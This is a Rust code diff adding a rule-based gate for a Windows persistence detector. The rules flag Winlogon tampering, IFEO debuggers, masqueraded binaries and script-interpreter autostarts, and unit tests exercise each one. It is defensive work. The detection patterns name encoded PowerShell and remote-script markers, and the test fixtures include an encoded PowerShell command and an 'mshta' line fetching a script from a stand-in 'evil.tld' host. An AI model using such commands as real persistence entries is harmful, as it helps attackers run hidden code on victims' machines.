@@ -3,12 +3,15 @@
 //! noise floor (weight >= 15). See score.rs for severity thresholds.
 use crate::score::{
     is_inbox_service_command, is_suspicious_path, is_trusted_appdata_location, severity_for,
-    winlogon_value_is_default, Score,
+    Score,
+};
+use crate::trust::{
+    is_masquerade, is_system_or_program_files, is_user_writable_path, winlogon_value_is_default,
 };
 use cairn_core::finding::{EntityFile, EntityRegistry};
 use cairn_core::record::{PersistenceRecord, Record};
 use cairn_core::traits::Analyzer;
-use cairn_core::{Entity, Finding, FindingSource, Result};
+use cairn_core::{Entity, Finding, FindingSource, Result, Severity};
 use chrono::{DateTime, Duration, Utc};
 
 /// Days within which a LastWrite counts as "recent" (a freshly-planted persistence entry).
@@ -100,6 +103,164 @@ fn score_persistence(p: &PersistenceRecord, now: DateTime<Utc>) -> Score {
     }
 
     s
+}
+
+/// One dispositive-signal hit (spec §4.2). `label` feeds the Finding title;
+/// `reason` feeds Finding.reason (golden rule 6).
+#[allow(dead_code)]
+pub(crate) struct GateHit {
+    pub severity: Severity,
+    pub label: &'static str,
+    pub reason: String,
+    pub mitre: &'static str,
+}
+
+/// Bump one severity band (multi-signal / execution-corroboration escalation).
+#[allow(dead_code)]
+fn escalate(sev: Severity) -> Severity {
+    match sev {
+        Severity::Info => Severity::Low,
+        Severity::Low => Severity::Medium,
+        Severity::Medium => Severity::High,
+        Severity::High | Severity::Critical => Severity::Critical,
+    }
+}
+
+/// S9 (spec §4.2): persistence command invoking a script interpreter.
+/// Encoded/remote content -> High; a plain local script file -> Low; else None.
+/// The interpreter must be the invoked binary itself (basename of binary_path, or the
+/// command's first token) — a substring match would flag "PowerShell Studio\app.exe".
+#[allow(dead_code)]
+fn script_persistence_signal(p: &PersistenceRecord) -> Option<GateHit> {
+    const INTERPRETERS: &[&str] = &[
+        "powershell.exe", "pwsh.exe", "wscript.exe", "cscript.exe", "mshta.exe", "cmd.exe",
+        "powershell", "pwsh", "wscript", "cscript", "mshta", "cmd",
+    ];
+    let cmd = p.command.as_deref()?;
+    let invoked = p
+        .binary_path
+        .as_deref()
+        .map(|bp| short_name_persist(bp).to_ascii_lowercase())
+        .or_else(|| {
+            cmd.trim().trim_matches('"').split_whitespace().next().map(|t| {
+                short_name_persist(t).to_ascii_lowercase()
+            })
+        })?;
+    if !INTERPRETERS.contains(&invoked.as_str()) {
+        return None;
+    }
+    let lower = cmd.to_ascii_lowercase();
+    let encoded = lower.contains(" -enc")
+        || lower.contains(" -encodedcommand")
+        || lower.contains("frombase64string");
+    let remote = lower.contains("http://") || lower.contains("https://");
+    if encoded || remote {
+        return Some(GateHit {
+            severity: Severity::High,
+            label: "腳本直譯器持久化（編碼/遠端內容）",
+            reason: format!("persistence command runs {invoked} with encoded or remote content: {cmd}"),
+            mitre: "T1059",
+        });
+    }
+    const SCRIPT_EXTS: &[&str] = &[".vbs", ".vbe", ".js", ".jse", ".bat", ".ps1", ".hta"];
+    if SCRIPT_EXTS.iter().any(|e| lower.contains(e)) {
+        return Some(GateHit {
+            severity: Severity::Low,
+            label: "腳本檔持久化",
+            reason: format!("persistence command runs {invoked} against a local script: {cmd}"),
+            mitre: "T1059",
+        });
+    }
+    None
+}
+
+/// Evaluate the dispositive-signal gate for one persistence record (spec §4.2).
+/// Empty vec = no rare signal = inventory, not a detection (route to Observation).
+#[allow(dead_code)]
+pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<GateHit> {
+    let mut hits = Vec::new();
+    let path = p.binary_path.as_deref().unwrap_or("");
+
+    // S1a: winlogon value tampered (default values are inventory).
+    if p.mechanism == "winlogon" {
+        let is_default = p
+            .value
+            .as_deref()
+            .zip(p.command.as_deref())
+            .is_some_and(|(v, c)| winlogon_value_is_default(v, c));
+        if !is_default {
+            hits.push(GateHit {
+                severity: Severity::High,
+                label: "Winlogon 遭篡改",
+                reason: format!(
+                    "Winlogon {} is not the stock default: {}",
+                    p.value.as_deref().unwrap_or("?"),
+                    p.command.as_deref().unwrap_or("-")
+                ),
+                mitre: "T1547.004",
+            });
+        }
+    }
+
+    // S1b: IFEO debugger — always gates (rare); severity by target trust.
+    if p.mechanism == "ifeo" {
+        let untrusted = p.signed == Some(false) || is_user_writable_path(path);
+        hits.push(GateHit {
+            severity: if untrusted { Severity::High } else { Severity::Medium },
+            label: "IFEO debugger 挾持",
+            reason: format!(
+                "IFEO Debugger set ({}); target {}",
+                p.location,
+                if untrusted { "unsigned or in a user-writable path" } else { "signed, system/vendor path (Process Explorer-style use)" }
+            ),
+            mitre: "T1546.012",
+        });
+    }
+
+    // S2: explicitly unsigned + user-writable drop zone.
+    if p.signed == Some(false) && is_user_writable_path(path) {
+        hits.push(GateHit {
+            severity: Severity::High,
+            label: "未簽章執行檔於使用者可寫路徑",
+            reason: format!("binary is explicitly unsigned and lives in a user-writable drop zone: {path}"),
+            mitre: "T1036",
+        });
+    }
+
+    // S3: system-name masquerade (absolute path outside C:\Windows).
+    if is_masquerade(path) {
+        hits.push(GateHit {
+            severity: Severity::High,
+            label: "系統程式名稱偽裝",
+            reason: format!("system binary name at a non-Windows location: {path}"),
+            mitre: "T1036.005",
+        });
+    }
+
+    // S4: recent + unverifiable + outside system/vendor dirs — all three required.
+    // Recency ALONE is dead (update-day mass rewrites, per-user service instances).
+    if p.signed.is_none() && !path.is_empty() && !is_system_or_program_files(path) {
+        if let Some(lw) = p.last_write {
+            let age = now.signed_duration_since(lw);
+            if age >= Duration::zero() && age <= Duration::days(RECENT_DAYS) {
+                hits.push(GateHit {
+                    severity: Severity::Medium,
+                    label: "近期建立且簽章無法驗證",
+                    reason: format!(
+                        "created/modified within {RECENT_DAYS} days, signature unverifiable, non-system path: {path}"
+                    ),
+                    mitre: "T1547",
+                });
+            }
+        }
+    }
+
+    // S9: script-interpreter persistence.
+    if let Some(hit) = script_persistence_signal(p) {
+        hits.push(hit);
+    }
+
+    hits
 }
 
 /// Return the bare file name from a command/path string (strips surrounding quotes too).
@@ -848,5 +1009,146 @@ mod tests {
         let details = &findings[0].details;
         assert!(details.starts_with("IFEO"), "must start with IFEO: {details}");
         assert!(!details.contains("mechanism="), "must not use debug format: {details}");
+    }
+
+    // ── gate model (spec §4.2) ───────────────────────────────────────────────
+    fn full_rec(
+        mechanism: &str,
+        value: Option<&str>,
+        command: Option<&str>,
+        binary_path: Option<&str>,
+        signed: Option<bool>,
+        last_write: Option<DateTime<Utc>>,
+    ) -> PersistenceRecord {
+        PersistenceRecord {
+            mechanism: mechanism.into(),
+            location: format!("HKLM\\...\\{mechanism}"),
+            value: value.map(String::from),
+            command: command.map(String::from),
+            binary_path: binary_path.map(String::from),
+            binary_sha256: None,
+            signed,
+            signer: None,
+            last_write,
+        }
+    }
+
+    #[test]
+    fn gate_s1a_winlogon_tamper_high_default_silent() {
+        let now = Utc::now();
+        let tampered = full_rec("winlogon", Some("Shell"), Some("explorer.exe,evil.exe"),
+            None, None, None);
+        let hits = evaluate_gate(&tampered, now);
+        assert_eq!(hits.len(), 1);
+        assert_eq!(hits[0].severity, Severity::High);
+        assert_eq!(hits[0].mitre, "T1547.004");
+        let stock = full_rec("winlogon", Some("Shell"), Some("explorer.exe"),
+            Some(r"C:\Windows\explorer.exe"), Some(true), Some(now));
+        assert!(evaluate_gate(&stock, now).is_empty(), "stock winlogon must be inventory");
+    }
+
+    #[test]
+    fn gate_s1b_ifeo_severity_by_target_trust() {
+        let now = Utc::now();
+        let evil = full_rec("ifeo", Some("Debugger"), Some(r"C:\Users\a\AppData\Roaming\d.exe"),
+            Some(r"C:\Users\a\AppData\Roaming\d.exe"), Some(false), None);
+        assert!(evaluate_gate(&evil, now).iter().any(|h| h.severity == Severity::High));
+        let procexp = full_rec("ifeo", Some("Debugger"), Some(r"C:\Program Files\SysInternals\procexp.exe"),
+            Some(r"C:\Program Files\SysInternals\procexp.exe"), Some(true), None);
+        let hits = evaluate_gate(&procexp, now);
+        assert_eq!(hits.len(), 1, "IFEO always gates");
+        assert_eq!(hits[0].severity, Severity::Medium, "signed vendor target -> Medium");
+    }
+
+    #[test]
+    fn gate_s2_unsigned_dropzone_high_but_signed_or_normal_path_silent() {
+        let now = Utc::now();
+        let evil = full_rec("run_key", Some("Upd"), Some(r"C:\Users\a\AppData\Roaming\e.exe"),
+            Some(r"C:\Users\a\AppData\Roaming\e.exe"), Some(false), None);
+        assert_eq!(evaluate_gate(&evil, now)[0].severity, Severity::High);
+        // signed chrome autostart -> inventory
+        let chrome = full_rec("run_key", Some("Chrome"),
+            Some(r"C:\Users\a\AppData\Local\Google\Chrome\chrome.exe"),
+            Some(r"C:\Users\a\AppData\Local\Google\Chrome\chrome.exe"), Some(true), Some(now));
+        assert!(evaluate_gate(&chrome, now).is_empty());
+        // unsigned but in Program Files (admin-write) -> not S2
+        let pf = full_rec("run_key", Some("V"), Some(r"C:\Program Files\V\v.exe"),
+            Some(r"C:\Program Files\V\v.exe"), Some(false), None);
+        assert!(evaluate_gate(&pf, now).is_empty());
+    }
+
+    #[test]
+    fn gate_s3_masquerade_absolute_only() {
+        let now = Utc::now();
+        let fake = full_rec("service", None, Some(r"C:\ProgramData\svchost.exe"),
+            Some(r"C:\ProgramData\svchost.exe"), None, None);
+        assert!(evaluate_gate(&fake, now).iter().any(|h| h.mitre == "T1036.005"));
+        let bare = full_rec("winlogon", Some("Shell"), Some("explorer.exe"), Some("explorer.exe"),
+            None, None);
+        // bare name: winlogon default -> no S1a; not absolute -> no S3
+        assert!(evaluate_gate(&bare, now).is_empty());
+    }
+
+    #[test]
+    fn gate_s4_needs_all_three_conditions() {
+        let now = Utc::now();
+        let recent = Some(now - Duration::days(2));
+        let hit = full_rec("service", None, Some(r"C:\Tools\agent.exe"),
+            Some(r"C:\Tools\agent.exe"), None, recent);
+        assert_eq!(evaluate_gate(&hit, now)[0].severity, Severity::Medium);
+        // signed -> no S4 (ASUS update-day services)
+        let signed = full_rec("service", None, Some(r"C:\Tools\agent.exe"),
+            Some(r"C:\Tools\agent.exe"), Some(true), recent);
+        assert!(evaluate_gate(&signed, now).is_empty());
+        // system path -> no S4 (per-user svchost instances)
+        let sys = full_rec("service", None, Some(r"C:\Windows\System32\svchost.exe -k X"),
+            Some(r"C:\Windows\System32\svchost.exe"), None, recent);
+        assert!(evaluate_gate(&sys, now).is_empty());
+        // old -> no S4
+        let old = full_rec("service", None, Some(r"C:\Tools\agent.exe"),
+            Some(r"C:\Tools\agent.exe"), None, Some(now - Duration::days(300)));
+        assert!(evaluate_gate(&old, now).is_empty());
+    }
+
+    #[test]
+    fn gate_s9_script_persistence_tiers() {
+        let now = Utc::now();
+        let enc = full_rec("run_key", Some("U"),
+            Some("powershell.exe -NoP -Enc SQBFAFgA"), None, None, None);
+        let h = evaluate_gate(&enc, now);
+        assert_eq!(h[0].severity, Severity::High);
+        let remote = full_rec("run_key", Some("U"),
+            Some(r"mshta.exe https://evil.tld/x.hta"), None, None, None);
+        assert_eq!(evaluate_gate(&remote, now)[0].severity, Severity::High);
+        let local = full_rec("scheduled_task", None,
+            Some(r"wscript.exe C:\Scripts\backup.vbs"), Some(r"C:\Windows\System32\wscript.exe"),
+            Some(true), None);
+        assert_eq!(evaluate_gate(&local, now)[0].severity, Severity::Low);
+        // interpreter-in-vendor-name must NOT fire (substring guard)
+        let studio = full_rec("run_key", Some("PS"),
+            Some(r"C:\Program Files\PowerShell Studio\app.exe --serve"),
+            Some(r"C:\Program Files\PowerShell Studio\app.exe"), Some(true), None);
+        assert!(evaluate_gate(&studio, now).is_empty());
+    }
+
+    #[test]
+    fn gate_service_and_runkey_existence_is_inventory() {
+        let now = Utc::now();
+        // The 25-Low class from the 2026-06-28 run: plain third-party service.
+        let svc = full_rec("service", None, Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
+            Some(r"C:\Program Files\ASUS\AsusAppService.exe"), Some(true), Some(now - Duration::days(400)));
+        assert!(evaluate_gate(&svc, now).is_empty());
+        // The 13-Medium class: same service on update day (recent) — still inventory.
+        let svc_recent = full_rec("service", None, Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
+            Some(r"C:\Program Files\ASUS\AsusAppService.exe"), Some(true), Some(now - Duration::days(2)));
+        assert!(evaluate_gate(&svc_recent, now).is_empty());
+    }
+
+    #[test]
+    fn escalate_caps_at_critical() {
+        assert_eq!(escalate(Severity::Low), Severity::Medium);
+        assert_eq!(escalate(Severity::Medium), Severity::High);
+        assert_eq!(escalate(Severity::High), Severity::Critical);
+        assert_eq!(escalate(Severity::Critical), Severity::Critical);
     }
 }
